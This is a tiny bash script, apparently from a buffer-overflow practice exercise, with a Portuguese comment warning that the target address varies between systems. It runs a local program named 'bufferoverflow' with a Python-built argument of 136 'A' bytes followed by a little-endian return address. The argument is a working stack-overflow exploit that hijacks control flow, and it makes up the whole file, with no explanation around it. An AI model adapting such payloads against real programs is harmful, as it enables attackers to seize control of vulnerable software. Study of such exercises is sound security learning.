#!/bin/bash
#atencao, o local de destino pode variar de sistema a sistema

./bufferoverflow $(python -c 'print("A"*136+b"\x65\x51\x55\x55\x55\x55\x00\x00") ')
